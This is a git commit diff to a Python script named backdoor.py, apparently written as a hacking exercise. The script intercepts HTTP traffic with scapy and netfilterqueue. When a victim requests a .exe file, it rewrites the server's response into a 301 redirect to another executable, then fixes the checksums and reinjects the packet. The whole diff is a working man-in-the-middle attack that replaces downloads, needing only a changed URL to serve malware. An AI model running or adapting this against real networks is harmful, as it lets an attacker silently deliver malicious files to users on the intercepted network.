d24ac8610bdbc9ae7cbea5acb6282569d9653e9a
Saad Shahzad <spider32277223@gmail.com>
2020-04-09 16:29:46 -0400

    Modifying HTTP Response and replacing download file

--- backdoor.py
+++ backdoor.py
@@ -13,13 +13,17 @@ def spoofed_packet(packets):
             if ".exe" in scapy_packet[scapy.Raw].load: # if file contains exe download
                 print("[+] exe Request")
                 list_ack.append(scapy_packet[scapy.TCP].ack) # store the ack in the list variable
-                print(scapy_packet.show())
         # Source Port
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in list_ack: # check if seq to the response in the ack list
                 list_ack.remove(scapy_packet[scapy.TCP].seq) # remove seq in the list because we don't want to use it anymore
                 print("[+] Replacing Download file")
-                print(scapy_packet.show())
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                del scapy_packet[scapy.IP].len
+                packets.set_payload(str(scapy_packet)) # Modify packet i.e. the function we created so it can be changed
+                                                       # in the spoofed functionality.
     packets.accept()  # accept packets
 
 queue = netfilterqueue.NetfilterQueue()  # Creating instance of netfilterqueue object
